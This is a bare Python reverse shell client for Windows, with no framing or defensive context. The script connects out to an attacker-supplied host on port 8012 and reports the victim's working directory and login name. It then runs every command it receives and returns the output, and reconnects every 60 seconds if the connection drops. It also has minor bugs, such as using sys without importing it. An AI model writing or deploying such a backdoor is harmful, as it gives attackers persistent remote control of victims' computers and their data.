import socket
import os
import subprocess
import time
import win32api

SERVER_HOST = sys.argv[1]
SERVER_PORT = 8012
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

while True:
    try:
        s = socket.socket()
        s.connect((SERVER_HOST, SERVER_PORT))
        cwd = os.getcwd()
        s.send(cwd.encode())
        s.send(os.getlogin().encode())
        while True:
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    output = ""
            elif splited_command[0].lower() == "test":
                continue
            elif command.startswith("reverseshell alert"):
                win32api.MessageBox(0, splited_command[3], splited_command[2], 0x00001000) 
            else:
                output = subprocess.getoutput(command)
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
    except:
        s.close()
        time.sleep(60)
    
